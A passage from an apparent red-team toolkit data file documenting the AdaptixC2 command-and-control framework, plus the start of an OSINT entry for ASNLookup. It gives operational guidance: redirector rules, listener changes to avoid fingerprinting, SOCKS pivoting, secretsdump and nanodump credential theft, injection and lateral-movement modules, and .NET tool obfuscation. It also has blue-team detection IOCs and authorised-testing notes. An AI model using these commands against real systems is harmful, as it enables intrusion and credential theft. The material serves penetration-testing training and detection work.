                "cmd": "RewriteEngine On\n# forward only the URIs/UA your BeaconHTTP listener uses, else serve a decoy\nRewriteCond %{REQUEST_URI} ^/(api/v1/status|updates/check\\.php|content\\.html)$ [NC]\nRewriteRule ^.*$ https://TEAMSERVER%{REQUEST_URI} [P,L]\nRewriteRule ^.*$ https://decoy-site.example/ [R=302,L]"
              },
              {
                "label": "Shape the listener so it isn't default",
                "cmd": "# in the BeaconHTTP listener config, change from the shipped defaults:\n#   URIs        -> your own paths (defaults /api/v1/status, /updates/check.php, /content.html)\n#   User-Agent  -> a realistic UA (default is an old Firefox/20 string — a known IOC)\n#   Headers     -> set believable Server/Host/Request headers\n#   Error page  -> replace the default 404 page (also fingerprinted)\n#   Heartbeat   -> rename the X-Beacon-Id header"
              }
            ]
          },
          {
            "title": "Pivoting with SOCKS + proxychains",
            "type": "commands",
            "commands": [
              {
                "label": "Open a SOCKS proxy through a beacon and run tools over it",
                "cmd": "# in the beacon console — start a SOCKS5 proxy on the team server:\nsocks start 1080 -auth user pass\n# point proxychains at it (/etc/proxychains.conf):\n#   socks5 127.0.0.1 1080 user pass\nproxychains -q nmap -sT -Pn -n -p 445,3389 10.10.20.0/24\nproxychains -q impacket-secretsdump CORP/user@10.10.20.5\n# forward a single internal service instead of a full proxy:\nrportfwd start 8443 10.10.20.5 443     # reach 10.10.20.5:443 via the team server"
              }
            ]
          },
          {
            "title": "The client at a glance — panels & views",
            "type": "table",
            "columns": [
              "Panel / view",
              "What it gives you"
            ],
            "rows": [
              [
                "Sessions table",
                "The live list of agents — check-in time, user, host, PID, process, OS, internal/external IP. Right-click to interact, task, or act on several at once; the health checker flags stale/lost agents."
              ],
              [
                "Session graph",
                "A visual map of agents and their links — SMB/TCP peer chains and pivots shown as a graph rather than a flat list."
              ],
              [
                "Agent console",
                "The per-agent task console where you type beacon commands; shows each queued task and its output."
              ],
              [
                "Tasks & Jobs",
                "Every task and long-running job across all agents, with status, output and which operator ran it — stored on the team server."
              ],
              [
                "Listeners",
                "Create, view and stop listeners (BeaconHTTP/S, SMB, TCP, DNS/DoH, Gopher)."
              ],
              [
                "File browser",
                "A graphical remote filesystem per agent — navigate, upload, download and delete without typing paths."
              ],
              [
                "Process browser",
                "A graphical process list per agent — inspect and kill processes, and pick injection targets."
              ],
              [
                "Remote terminal",
                "An interactive pty-style shell for an agent, separate from the task console."
              ],
              [
                "Downloads",
                "Manager for files pulled back from targets — track, re-sync and remove them."
              ],
              [
                "Screenshots",
                "Gallery of screenshots captured from agents."
              ],
              [
                "Credentials",
                "Central credentials manager — looted/collected creds stored on the server and shared across operators."
              ],
              [
                "Targets",
                "Targets manager — hosts in scope, annotated and tracked across the engagement."
              ],
              [
                "Tunnels",
                "SOCKS4/5 (with optional auth) proxies and local/reverse port-forwards set up through an agent, listed and managed in one place."
              ],
              [
                "Chat",
                "Team chat between operators on the same server — multiplayer deconfliction."
              ],
              [
                "Logs",
                "The server/operator event log."
              ],
              [
                "AxScript console",
                "The AxScript engine — extend and automate the client (custom commands, menus, UI, BOF wrappers), e.g. with the Extension-Kit."
              ]
            ]
          },
          {
            "title": "The AdaptixClient window",
            "type": "figure",
            "caption": "The AdaptixClient layout: the menu bar (Projects, AxScript, Settings), the icon toolbar for the dockable views (sessions, graph, listeners, tunnels, downloads, screenshots, credentials, targets, chat, notifications), the sessions table with its real columns, and an agent task console. An agent reached over SMB shows 'smb' in its Listener column rather than an HTTP listener name.",
            "svg": "<svg id='axwin' viewBox='0 0 924 504' xmlns='http://www.w3.org/2000/svg' role='img' aria-label='AdaptixClient main window mockup: menu bar (Projects, AxScript, Settings), an icon toolbar, the sessions table with its real columns (Agent Id, Type, Listener, Internal, Computer, User, OS, PID, Last, Sleep), and an agent task console.'><defs><clipPath id='axwinclip'><rect x='8' y='8' width='908' height='488' rx='8'/></clipPath><style>#axwin .t{fill:#d6d7e0;font-family:Inter,Segoe UI,sans-serif;font-size:12px}#axwin .hd{fill:#9a9cb0;font-family:Inter,Segoe UI,sans-serif;font-size:10.5px;font-weight:600;letter-spacing:.3px}#axwin .cell{fill:#cfd0da;font-family:'JetBrains Mono',monospace;font-size:10.5px}#axwin .mono{font-family:'JetBrains Mono',monospace;font-size:11px}#axwin .ic{fill:none;stroke:#9a9cb0;stroke-width:1.2;stroke-linecap:round;stroke-linejoin:round}#axwin .ica{fill:none;stroke:#cfd0da;stroke-width:1.3;stroke-linecap:round;stroke-linejoin:round}</style></defs><g clip-path='url(#axwinclip)'><rect x='8' y='8' width='908' height='488' fill='#1e1f29'/><rect x='8' y='8' width='908' height='28' fill='#2a2b38'/><text x='22' y='26' fill='#d6d7e0' font-family='Inter,Segoe UI,sans-serif' font-size='12' font-weight='600'>AdaptixClient</text><text x='120' y='26' fill='#8b8da0' font-family='Inter,Segoe UI,sans-serif' font-size='11'>&#8212; MyLab @ 127.0.0.1:4321</text><rect x='8' y='36' width='908' height='24' fill='#232430'/><text x='22' y='52' class='t'>Projects</text><text x='92' y='52' class='t'>AxScript</text><text x='168' y='52' class='t'>Settings</text><rect x='16' y='68' width='30' height='24' rx='4' fill='#1e1f29' stroke='#3d7dfd' stroke-width='1.5'/><line class='ica' x1='24' y1='76' x2='38' y2='76'/><line class='ica' x1='24' y1='80' x2='38' y2='80'/><line class='ica' x1='24' y1='84' x2='38' y2='84'/><rect x='50' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><circle class='ic' cx='59' cy='76' r='2'/><circle class='ic' cx='71' cy='76' r='2'/><circle class='ic' cx='65' cy='85' r='2'/><line class='ic' x1='60' y1='77' x2='64' y2='84'/><line class='ic' x1='70' y1='77' x2='66' y2='84'/><rect x='84' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><path class='ic' d='M93 86 L99 74 L105 86 Z'/><rect x='118' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><line class='ic' x1='126' y1='77' x2='139' y2='77'/><path class='ic' d='M136 74 L140 77 L136 80'/><line class='ic' x1='140' y1='83' x2='127' y2='83'/><path class='ic' d='M130 80 L126 83 L130 86'/><rect x='152' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><line class='ic' x1='167' y1='73' x2='167' y2='84'/><path class='ic' d='M162 79 L167 84 L172 79'/><rect x='186' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><rect class='ic' x='193' y='75' width='16' height='10' rx='2'/><circle class='ic' cx='201' cy='80' r='2.6'/><rect x='220' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><circle class='ic' cx='231' cy='80' r='3'/><line class='ic' x1='234' y1='80' x2='243' y2='80'/><line class='ic' x1='241' y1='80' x2='241' y2='83'/><rect x='254' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><circle class='ic' cx='269' cy='80' r='6'/><circle class='ic' cx='269' cy='80' r='2'/><rect x='288' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><rect class='ic' x='296' y='74' width='15' height='10' rx='2.5'/><path class='ic' d='M300 84 L300 87 L304 84'/><rect x='322' y='68' width='30' height='24' rx='4' fill='#262735' stroke='#3b3d4e'/><path class='ic' d='M332 83 q0 -9 5 -9 q5 0 5 9 z'/><line class='ic' x1='330' y1='83' x2='344' y2='83'/><circle class='ic' cx='337' cy='86' r='1.3'/><rect x='16' y='104' width='892' height='24' fill='#2a2b38'/><text x='26' y='120' class='hd'>Agent Id</text><text x='116' y='120' class='hd'>Type</text><text x='176' y='120' class='hd'>Listener</text><text x='258' y='120' class='hd'>Internal</text><text x='360' y='120' class='hd'>Computer</text><text x='452' y='120' class='hd'>User</text><text x='576' y='120' class='hd'>OS</text><text x='706' y='120' class='hd'>PID</text><text x='764' y='120' class='hd'>Last</text><text x='836' y='120' class='hd'>Sleep</text><rect x='16' y='128' width='892' height='26' fill='#20212c'/><text x='26' y='145' class='cell'>a1b2c3d4</text><text x='116' y='145' class='cell'>beacon</text><text x='176' y='145' class='cell'>http-443</text><text x='258' y='145' class='cell'>10.10.14.5</text><text x='360' y='145' class='cell'>WKS01</text><text x='452' y='145' class='cell'>CORP\\jdoe</text><text x='576' y='145' class='cell'>Windows 10 22H2</text><text x='706' y='145' class='cell'>4820</text><text x='764' y='145' class='cell'>3s</text><text x='836' y='145' class='cell'>5s</text><rect x='16' y='154' width='892' height='26' fill='#23242f'/><text x='26' y='171' class='cell'>9f8e7d6c</text><text x='116' y='171' class='cell'>beacon</text><text x='176' y='171' class='cell'>http-443</text><text x='258' y='171' class='cell'>10.10.14.9</text><text x='360' y='171' class='cell'>SQL01</text><text x='452' y='171' class='cell'>CORP\\svc_sql</text><text x='576' y='171' class='cell'>Server 2019</text><text x='706' y='171' class='cell'>2210</text><text x='764' y='171' class='cell'>11s</text><text x='836' y='171' class='cell'>1m</text><rect x='16' y='180' width='892' height='26' fill='#20212c'/><text x='26' y='197' class='cell'>5a4b3c2d</text><text x='116' y='197' class='cell'>beacon</text><text x='176' y='197' fill='#d9933f' class='mono'>smb</text><text x='258' y='197' class='cell'>10.10.20.7</text><text x='360' y='197' class='cell'>DC01</text><text x='452' y='197' class='cell'>CORP\\Administrator</text><text x='576' y='197' class='cell'>Server 2022</text><text x='706' y='197' class='cell'>680</text><text x='764' y='197' class='cell'>1m 4s</text><text x='836' y='197' class='cell'>30s</text><rect x='16' y='220' width='892' height='268' rx='4' fill='#17171f'/><text x='26' y='244' class='mono'><tspan fill='#4ec9b0'>op1</tspan> <tspan fill='#8b8da0'>[a1b2c3d4]</tspan> <tspan fill='#d9933f'>beacon &gt;</tspan> <tspan fill='#e8e8f0'>getuid</tspan></text><text x='26' y='266' class='mono' fill='#b8b9c6'>[*] Task: get username of current token</text><text x='26' y='286' class='mono' fill='#6ab04c'>[+] CORP\\jdoe</text><text x='26' y='316' class='mono'><tspan fill='#4ec9b0'>op1</tspan> <tspan fill='#8b8da0'>[a1b2c3d4]</tspan> <tspan fill='#d9933f'>beacon &gt;</tspan> <tspan fill='#e8e8f0'>execute bof /opt/kit/Creds-BOF/_bin/nanodump.x64.o</tspan></text><text x='26' y='338' class='mono' fill='#b8b9c6'>[*] Task: execute BOF [3a1f] queued</text><text x='26' y='358' class='mono' fill='#6ab04c'>[+] BOF output</text><text x='26' y='378' class='mono' fill='#b8b9c6'>[*] Minidump written: 2.41 MB &#8594; downloads/lsass_DC01.dmp</text><text x='26' y='400' class='mono'><tspan fill='#4ec9b0'>op1</tspan> <tspan fill='#8b8da0'>[a1b2c3d4]</tspan> <tspan fill='#d9933f'>beacon &gt;</tspan> <tspan fill='#e8e8f0'>socks start 1080</tspan></text><text x='26' y='422' class='mono' fill='#6ab04c'>[+] SOCKS5 proxy started on team server :1080</text><text x='26' y='452' class='mono'><tspan fill='#4ec9b0'>op1</tspan> <tspan fill='#8b8da0'>[a1b2c3d4]</tspan> <tspan fill='#d9933f'>beacon &gt;</tspan> <tspan fill='#e8e8f0'>_</tspan></text></g><rect x='8' y='8' width='908' height='488' rx='8' fill='none' stroke='#3b3d4e' stroke-width='1.5'/></svg>"
          },
          {
            "title": "Collaboration, pivoting & scripting",
            "type": "notes",
            "items": [
              "Multiplayer: several operators connect to one team server and share sessions, tasks, downloads, credentials, targets, chat and logs in real time — the point of the server/client split.",
              "Pivoting: route tooling through a beacon with socks (SOCKS4/5, optional auth) or rportfwd/lportfwd, all managed from the Tunnels panel; reach internal-only hosts by linking SMB/TCP peer agents (link/unlink), which then appear as edges in the session graph.",
              "BOF support: run Beacon Object Files in-process (sync and async) with bof; the official Extension-Kit adds ready-made BOFs and command packs you load as extenders.",
              "Scripting: the client is driven by the AxScript engine — add commands, menus and automation from the AxScript console, and auto-load .axs scripts via the axscripts list in profile.yaml.",
              "Agent control: KillDate expires an agent after a date and WorkingTime limits it to set hours, so beacons stay quiet outside the engagement window."
            ]
          },
          {
            "title": "Beacon commands — files & navigation",
            "type": "table",
            "columns": [
              "Command (syntax)",
              "What it does"
            ],
            "rows": [
              [
                "pwd",
                "Print the current working directory"
              ],
              [
                "cd <path>",
                "Change the working directory (e.g. cd C:\\Windows)"
              ],
              [
                "ls [path]",
                "List a directory or file details (default: current dir)"
              ],
              [
                "cat <file>",
                "Read the first 2048 bytes of a file"
              ],
              [
                "cp <src> <dst>",
                "Copy a file"
              ],
              [
                "mv <src> <dst>",
                "Move a file"
              ],
              [
                "mkdir <path>",
                "Create a directory"
              ],
              [
                "rm <path>",
                "Remove a file or folder"
              ],
              [
                "disks",
                "List mounted drives"
              ],
              [
                "download <file>",
                "Download a file from the host to the team server"
              ],
              [
                "upload <local> <remote>",
                "Upload a file to the host (upload /tmp/x.txt C:\\Temp\\x.txt)"
              ],
              [
                "exfil list | stop | start | cancel <id>",
                "Manage in-flight downloads (pause/resume/cancel)"
              ]
            ]
          },
          {
            "title": "Beacon commands — execution & tokens",
            "type": "table",
            "columns": [
              "Command (syntax)",
              "What it does"
            ],
            "rows": [
              [
                "shell <cmd>",
                "Run a command via cmd.exe (shell whoami /all)"
              ],
              [
                "powershell <cmd>",
                "Run a command via powershell.exe"
              ],
              [
                "run [-s] [-o] [-i] <prog> [args]",
                "Start a NEW process — -s suspended, -o capture output, -i impersonate (run -s cmd.exe /c whoami)"
              ],
              [
                "execute bof [-a] <file.o> [args]",
                "Run a Beacon Object File in-process; -a = async (execute bof /home/op/whoami.o)"
              ],
              [
                "ps list",
                "Show the process list"
              ],
              [
                "ps kill <pid>",
                "Kill a process by PID"
              ],
              [
                "getuid",
                "Print the user of the current token"
              ],
              [
                "rev2self",
                "Revert to the agent's original access token"
              ]
            ]
          },
          {
            "title": "Beacon commands — pivoting & tunnelling",
            "type": "table",
            "columns": [
              "Command (syntax)",
              "What it does"
            ],
            "rows": [
              [
                "socks start <port> [-auth user pass]",
                "Open a SOCKS4a/5 proxy through the agent (SOCKS5 auth optional)"
              ],
              [
                "socks stop <port>",
                "Stop a SOCKS proxy"
              ],
              [
                "rportfwd start <port> <fwdhost> <fwdport>",
                "Reverse port-forward: agent listens, relays via the server"
              ],
              [
                "rportfwd stop <port>",
                "Stop a reverse port-forward"
              ],
              [
                "lportfwd start <lhost> <lport> <fwdhost> <fwdport>",
                "Local port-forward: server listens, relays through the agent"
              ],
              [
                "lportfwd stop <lport>",
                "Stop a local port-forward"
              ],
              [
                "link smb <host> <pipename>",
                "Connect to / re-establish an SMB peer agent (link smb 192.168.1.2 pipe_a1b2)"
              ],
              [
                "link tcp <host> <port>",
                "Connect to / re-establish a TCP peer agent"
              ],
              [
                "unlink <id>",
                "Disconnect a linked peer agent"
              ]
            ]
          },
          {
            "title": "Beacon commands — session, jobs & profile",
            "type": "table",
            "columns": [
              "Command (syntax)",
              "What it does"
            ],
            "rows": [
              [
                "sleep <time> [jitter%]",
                "Set check-in interval and jitter (sleep 30m5s 10 = 30m5s ± 10%)"
              ],
              [
                "interact",
                "Shortcut for sleep 0 — go fully interactive"
              ],
              [
                "jobs list",
                "List long-running / background jobs"
              ],
              [
                "jobs kill <id>",
                "Kill a background job"
              ],
              [
                "terminate thread | process",
                "Stop the beacon thread (leave process) or kill the process"
              ],
              [
                "profile killdate <DD.MM.YYYY hh:mm:ss>",
                "Auto-stop the beacon at a date/time (GMT; 0 disables)"
              ],
              [
                "profile workingtime <HH:mm-HH:mm>",
                "Restrict the beacon to active hours (0 disables)"
              ],
              [
                "profile download.chunksize <bytes>",
                "Set the exfil chunk size for downloads (default 128000)"
              ],
              [
                "burst set <...> | burst show",
                "DNS burst-mode tuning (DNS listener only)"
              ]
            ]
          },
          {
            "title": "The beacon console",
            "type": "figure",
            "src": "assets/img/adaptix-c2/beacon-console.webp",
            "alt": "AdaptixClient beacon console running kerbeus asktgt and s4u, showing the task header/footer framing and base64 Kerberos tickets in the output.",
            "caption": "The beacon console. Each command is framed by a '[*] Task …' header and a '+--- Task [id] closed ---+' footer; '[+]' marks output and '[*]' marks status. Here the Kerbeus BOF requests a TGT (asktgt) and then performs an S4U impersonation, printing the base64 .kirbi tickets."
          },
          {
            "title": "BOFs & extensions — the model",
            "type": "table",
            "columns": [
              "Type",
              "What it is and how it loads"
            ],
            "rows": [
              [
                "Extender",
                "A SERVER-side plugin for a listener or an agent (BeaconHTTP, the Beacon agent, Gopher…). Loaded by the extenders: list in profile.yaml when the team server starts."
              ],
              [
                "AxScript extension (.axs)",
                "A CLIENT-side script that adds commands, menus, dialogs and BOF wrappers through the ax.* API. Loaded from the client (Extender panel) or auto-loaded via axscripts: in profile.yaml."
              ],
              [
                "BOF (Beacon Object File)",
                "A small COFF .o object compiled from C and run in-process by the agent via 'execute bof'. Normally wrapped by an AxScript command that packs its arguments."
              ],
              [
                "Extension-Kit",
                "The official pack of AxScript extensions + BOFs (AD, Creds, Elevation, Execution, Injection, Lateral Movement, Postex, Process…), pulled in by one top-level extension-kit.axs."
              ]
            ]
          },
          {
            "title": "Extension-Kit — module catalogue",
            "type": "table",
            "columns": [
              "Module",
              "What it adds (selected commands)"
            ],
            "rows": [
              [
                "AD-BOF",
                "Active Directory enum & attacks: ldapsearch/adsi/ldapq, kerberoasting, asreproasting, asktgt/asktgs, Kerbeus, ADCS (certi), LDAP/SQL (mssql) BOFs, trust & object discovery."
              ],
              [
                "Creds-BOF",
                "Credential theft: nanodump (incl. PPL dump/medic), lsadump_sam/secrets/cache, hashdump, cookie-monster (browser cookies), askcreds."
              ],
              [
                "Elevation-BOF",
                "Privilege escalation to SYSTEM: getsystem (token), UAC bypasses (SSPI, regshell), DCOMPotato, PrintSpoofer, alwayselevated check."
              ],
              [
                "Execution-BOF",
                "In-memory execution: execute-assembly (.NET), No-Consolation, CLR enable/disable, shellcode runners."
              ],
              [
                "Injection-BOF",
                "Process injection variants: inject-sec, inject-cfg, inject-poolparty, inject-32to64, spoofing helpers."
              ],
              [
                "LateralMovement-BOF",
                "Move between hosts: jump (service/schtask/wmi style), remote execution helpers."
              ],
              [
                "Postex-BOF",
                "Post-exploitation: screenshot, clipboard, env, netstat/arp/ipconfig, autorun & service modification."
              ],
              [
                "Process-BOF",
                "Process work: listing, handles, token info, process manipulation."
              ],
              [
                "SAL-BOF / SAR-BOF",
                "Situational Awareness (Local / Remote): host and network recon one-liners (firewall rules, shares, sessions, RPC checks)."
              ]
            ]
          },
          {
            "title": "The Creds-BOF command group",
            "type": "figure",
            "src": "assets/img/adaptix-c2/creds-bof.webp",
            "alt": "Creds-BOF command group help listing credential commands such as nanodump, lsadump_sam, cookie-monster and hashdump.",
            "caption": "Once a module is loaded, typing its group name prints every command it added. Creds-BOF contributes the credential-theft set — nanodump (plus PPL dump/medic), lsadump_sam/secrets/cache, hashdump, cookie-monster and askcreds."
          },
          {
            "title": "The SQL-BOF command group",
            "type": "figure",
            "src": "assets/img/adaptix-c2/sql-bof.webp",
            "alt": "SQL-BOF command group help listing mssql subcommands such as query, links, enableole, impersonate and xpcmd.",
            "caption": "The AD-BOF module's SQL-BOF commands (mssql …) for attacking SQL Server: enumerate databases, tables and linked servers; toggle xp_cmdshell / OLE / CLR; impersonate logins; and run commands — each as an in-process BOF."
          },
          {
            "title": "Load an extension in the client",
            "type": "commands",
            "commands": [
              {
                "label": "Option 1 — build the kit, then load it in the client",
                "cmd": "# install the BOF build deps and compile the modules:\napt install g++-mingw-w64-x86-64-posix gcc-mingw-w64-x86-64-posix mingw-w64-tools\ngit clone https://github.com/Adaptix-Framework/Extension-Kit\ncd Extension-Kit && make\n# In the client:  Main menu -> AxScript -> Script manager -> (context menu) Load new\n#   select Extension-Kit/extension-kit.axs to pull in every module at once.\n# New commands appear in the beacon console and right-click menus immediately."
              },
              {
                "label": "Option 2 — auto-load at team-server start",
                "cmd": "# list scripts under axscripts: in profile.yaml so every operator gets them:\nTeamserver:\n  axscripts:\n    - \"Extension-Kit/extension-kit.axs\""
              },
              {
                "label": "How a loader .axs chains its modules",
                "cmd": "// a top-level loader just script_loads each sub-extension, relative to itself:\nvar path = ax.script_dir();\nax.script_load(path + \"Elevation-BOF/elevate.axs\");\nax.script_load(path + \"Creds-BOF/creds.axs\");"
              }
            ]
          },
          {
            "title": "The AxScript menu",
            "type": "figure",
            "src": "assets/img/adaptix-c2/axscript-menu.webp",
            "alt": "AdaptixClient menu bar with the AxScript menu open, showing 'AxScript console' and 'Script manager'.",
            "caption": "AxScript → Script manager is where an .axs extension is loaded (its context menu → Load new). The AxScript console beside it runs ad-hoc ax.* script against the live client."
          },
          {
            "title": "Example — add your own BOF-backed command",
            "type": "commands",
            "commands": [
              {
                "label": "1. Build the BOF (a COFF .o from C, both arches)",
                "cmd": "# BOFs are object files compiled with mingw — build x64 and x86:\nx86_64-w64-mingw32-gcc -c whoami.c -o _bin/whoami.x64.o\ni686-w64-mingw32-gcc   -c whoami.c -o _bin/whoami.x86.o\n# (the Extension-Kit uses a Makefile/CMake per folder to do this.)"
              },
              {
                "label": "2. Wrap it in an AxScript command (myext.axs)",
                "cmd": "var metadata = { name: \"MyExt\", description: \"example BOF command\" };\n\n// define the command and its help/example\nvar cmd = ax.create_command(\"whoami-bof\", \"Run whoami via a BOF\", \"whoami-bof\");\n\n// the pre-hook runs when the operator types the command\ncmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {\n    // pick the object file matching the agent's architecture\n    let bof = ax.script_dir() + \"_bin/whoami.\" + ax.arch(id) + \".o\";\n    // pack BOF arguments; types = cstr | wstr | int | short | bytes\n    let args = ax.bof_pack(\"cstr int\", [\"example\", 1337]);\n    // queue it on the agent as an 'execute bof' task\n    ax.execute_alias(id, cmdline, `execute bof \"${bof}\" ${args}`, \"Task: whoami (BOF)\");\n});\n\n// bind the command to the beacon agent, Windows only\nvar group = ax.create_commands_group(\"MyExt\", [cmd]);\nax.register_commands_group(group, [\"beacon\"], [\"windows\"], []);"
              },
              {
                "label": "3. Load myext.axs in the client",
                "cmd": "# Main menu -> AxScript -> Script manager -> Load new -> myext.axs\n# 'whoami-bof' is now available in the beacon console; running it compiles the\n# args with bof_pack and tasks the agent with: execute bof \"..._bin/whoami.x64.o\" <packed>"
              }
            ]
          },
          {
            "title": "Obfuscating .NET post-ex tooling (Obfuscar)",
            "type": "commands",
            "commands": [
              {
                "label": "Context",
                "cmd": "# execute-assembly (Extension-Kit, Execution-BOF) runs a .NET assembly inside\n# the agent's process:   execute-assembly [--async] <assembly.exe> [args]\n# C# tools (Seatbelt, Rubeus, SharpHound) are .NET assemblies, so they can be\n# obfuscated at BUILD TIME with Obfuscar before they are loaded."
              },
              {
                "label": "Obfuscate, then run (authorised testing)",
                "cmd": "obfuscar.console tool-obfuscar.xml        # build-time: rename + hide strings\nexecute-assembly /opt/tools/Seatbelt.exe -group=user   # in the beacon console"
              },
              {
                "label": "What it does and does not change",
                "cmd": "# changes STATIC indicators only (symbol names, string literals) and hampers\n# reverse engineering of a recovered sample. It does NOT bypass AMSI (the CLR\n# is hosted in-process and the assembly bytes are still scanned) or behavioural\n# EDR. Test the obfuscated build with real args first — reflection-bound tools\n# can break under renaming. See the Obfuscar toolkit entry for the workflow."
              }
            ]
          },
          {
            "title": "Troubleshooting & gotchas",
            "type": "table",
            "columns": [
              "Symptom",
              "Cause / fix"
            ],
            "rows": [
              [
                "Server exits: cert/profile not found",
                "Run ./adaptixserver from INSIDE dist/ — the profile's cert/key and the extenders are relative paths resolved from the working directory."
              ],
              [
                "Listener won't load / 'extender not found'",
                "Build the extenders first (make extenders) so dist/extenders/* exist, and make sure each is listed under extenders: in profile.yaml."
              ],
              [
                "Client won't connect",
                "Endpoint must match the profile (/endpoint), use the right port (4321), confirm the server is listening (ss -tlnp | grep 4321) and the firewall allows it, and accept the self-signed cert on first connect."
              ],
              [
                "Gopher agent / server build fails",
                "The server build uses Adaptix's go-win7 Go fork for the Gopher agent — let pre_install_linux_all.sh server set it up, or use the Docker build."
              ],
              [
                "Client build fails",
                "Needs Qt6 dev packages + cmake — run ./pre_install_linux_all.sh client (or build the client AppImage via Docker)."
              ],
              [
                "Anyone can log in",
                "Change the default password \"pass\" in profile.yaml before first start; 4321 is widely scanned."
              ],
              [
                "Agent runs but no check-in",
                "Arch (x64/x86) or format must suit the target; Service Exe needs a service name; the agent's callback host must be reachable (redirector/listener up)."
              ]
            ]
          },
          {
            "title": "Detection & IOCs (blue team)",
            "type": "table",
            "columns": [
              "Default artefact",
              "What to hunt for"
            ],
            "rows": [
              [
                "Response headers",
                "Server: AdaptixC2 and an Adaptix-Version header come from the default profile — a high-signal hunt until operators change them."
              ],
              [
                "Heartbeat header",
                "Beacon check-ins carry the default X-Beacon-Id request header."
              ],
              [
                "User-Agent",
                "Default UA is the ancient 'Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0' (Firefox/20) — rare in real traffic."
              ],
              [
                "URIs",
                "Default BeaconHTTP URIs /api/v1/status, /updates/check.php, /content.html; Unit42 also observed POST to /uri.php with X-Beacon-Id."
              ],
              [
                "Ports",
                "Team-server/operator port 4321 by default; HTTP listeners commonly 443/4443."
              ],
              [
                "404 / payload pages",
                "The listener's default Page Error body is the literal 'ERROR 404 - PAGE NOT FOUND' HTML, and the default Page Payload wraps beacon data in {\"status\": \"ok\", \"data\": \"...\", \"metrics\": \"sync\"} — both are fingerprintable when left default."
              ],
              [
                "Network pivoting",
                "Censys/Hunt.io cluster servers by TLS certificate, JARM, and response-header hash — useful for finding related infrastructure."
              ]
            ]
          },
          {
            "title": "OPSEC & lab notes",
            "type": "notes",
            "items": [
              "Authorised testing only. Build and detonate agents in a controlled environment, and only against systems you own or are scoped to test.",
              "Change the default team-server password before the first start — anyone who reaches port 4321 with the default password gets full control of your C2.",
              "For a single-host lab, set interface to 127.0.0.1 so the team server is not exposed on the network.",
              "The self-signed cert is fine locally; for real engagements use a proper domain and certificate and put a redirector in front of every listener so the team server is never exposed directly.",
              "Tune sleep and jitter to the environment — the defaults are a starting point, not an OPSEC strategy — and tear listeners/agents down at the end of the engagement."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "AdaptixC2 — GitHub",
                "url": "https://github.com/Adaptix-Framework/AdaptixC2"
              },
              {
                "label": "AdaptixC2 — official documentation (GitBook)",
                "url": "https://adaptix-framework.gitbook.io/adaptix-framework"
              },
              {
                "label": "Extension-Kit (extra listeners, agents, BOFs)",
                "url": "https://github.com/Adaptix-Framework/Extension-Kit"
              },
              {
                "label": "Unit 42 — AdaptixC2 in real-world attacks (detection)",
                "url": "https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/"
              },
              {
                "label": "Hunt.io — AdaptixC2 capabilities, tactics & hunting",
                "url": "https://hunt.io/blog/adaptixc2-uncovered-capabilities-tactics-hunting"
              },
              {
                "label": "Censys — fingerprinting AdaptixC2 at scale",
                "url": "https://censys.com/blog/adaptixc2-open-source-c2-framework/"
              },
              {
                "label": "Theory — Command & Control (C2) Frameworks",
                "url": "theory/2026-09-23-command-and-control.html"
              },
              {
                "label": "Theory — C2 Infrastructure & OPSEC",
                "url": "theory/2026-10-09-c2-infrastructure-opsec.html"
              },
              {
                "label": "Toolkit — Sliver",
                "url": "tool-detail.html?tool=sliver"
              },
              {
                "label": "Toolkit — Obfuscar (obfuscate .NET post-ex tooling)",
                "url": "tool-detail.html?tool=obfuscar"
              }
            ]
          }
        ]
      }
    ]
  },
  {
    category: "OSINT",
    tools: [
      {
        "id": "asnlookup",
        "name": "ASNLookup",
        "url": "https://github.com/yassineaboukir/Asnlookup",
        "description": "Resolve an organisation to its ASNs and the IP ranges (CIDRs) they announce.",
        "brief": "ASNLookup maps a company name or ASN to the IP ranges it owns, which turns a single organisation into a concrete list of netblocks to scan. It is a fast first step for large-scope recon, before subdomain work.",
        "quickReference": [
          {
            "label": "By organisation name",
            "cmd": "asnlookup -o \"Target Corp\""
          },
          {
            "label": "By ASN, output CIDRs",
            "cmd": "asnlookup -a AS12345 -c"
          },
          {
            "label": "Pipe ranges into a scanner",
            "cmd": "asnlookup -o Target -c | tee ranges.txt"
          }
        ],
        "sections": [
          {
            "title": "Key flags",
            "type": "table",
            "columns": [
              "Flag",
              "Description"
            ],
            "rows": [
              [
                "-o \"<org>\"",
                "Search by organisation name and return its ASNs"
              ],
              [
                "-a <ASN>",
                "Look up a specific ASN"
              ],
              [
                "-c",
                "Output the CIDR ranges only (pipe-friendly for scanners)"
              ]
            ]
          },
          {
            "title": "Common workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Organisation to netblocks",
                "cmd": "asnlookup -o \"Target Corp\""
              },
              {
                "label": "ASN to CIDR ranges",
                "cmd": "asnlookup -a AS12345 -c"
              },
              {
                "label": "Feed ranges straight into a scanner",
                "cmd": "asnlookup -o \"Target Corp\" -c | tee ranges.txt\nnmap -iL ranges.txt -sn        # or naabu -list ranges.txt"
              }
            ]
          },
          {
            "title": "Notes & Tips",
            "type": "notes",
            "items": [
              "Confirm every range actually belongs to the target before scanning — shared hosting and cloud ASNs contain other people's assets.",
              "Cross-check results against bgp.he.net and metabigor; no single source is complete."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Asnlookup — GitHub (yassineaboukir)",
                "url": "https://github.com/yassineaboukir/Asnlookup"
              },
              {
                "label": "Toolkit — metabigor (cross-check ranges)",
                "url": "tool-detail.html?tool=metabigor"
              },
              {
                "label": "External Red Team Workflow",
                "url": "external-red-team-workflow.html"
              }
            ]
          }
        ]
      },
      {
        "id": "metabigor",
        "name": "Metabigor",
        "url": "https://github.com/j3ssie/metabigor",
        "description": "OSINT tool that turns organisation names into ASNs and IP ranges with no API keys.",
